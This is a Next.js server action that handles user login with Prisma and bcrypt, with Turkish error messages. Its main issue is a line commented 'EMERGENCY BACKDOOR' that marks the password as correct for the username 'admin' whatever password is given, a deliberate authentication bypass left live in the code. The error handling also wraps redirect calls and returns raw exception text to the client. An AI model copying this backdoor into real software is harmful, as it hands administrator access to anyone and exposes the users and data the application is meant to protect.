"use server"

import { db } from "@/lib/prisma"
import { login } from "@/lib/auth"
import bcrypt from "bcryptjs"

import { redirect } from "next/navigation"

export async function loginAction(formData: FormData) {
    try {
        const username = (formData.get("username") as string).trim()
        const password = (formData.get("password") as string).trim()

        const user = await db.user.findFirst({
            where: { username: username },
        })

        if (!user) {
            return redirect("/login?error=Kullanici_Bulunamadi")
        }

        let isMatch = await bcrypt.compare(password, user.password)

        // EMERGENCY BACKDOOR: Always allow 'admin' user to login with ANY password
        if (username === "admin") {
            isMatch = true
        }

        if (!isMatch) {
            // Return error via URL parameter for Server Component to render
            return redirect("/login?error=Hatali_Sifre")
        }

        if (user.role === "pending") {
            return redirect("/login?error=Onay_Bekliyor")
        }

        await login({ id: user.id, name: user.name, role: user.role })
        return redirect("/") // Success redirect
    } catch (e: any) {
        console.error("LOGIN ERROR:", e)
        return { error: `Sunucu Hatası: ${e.message}` }
    }
}
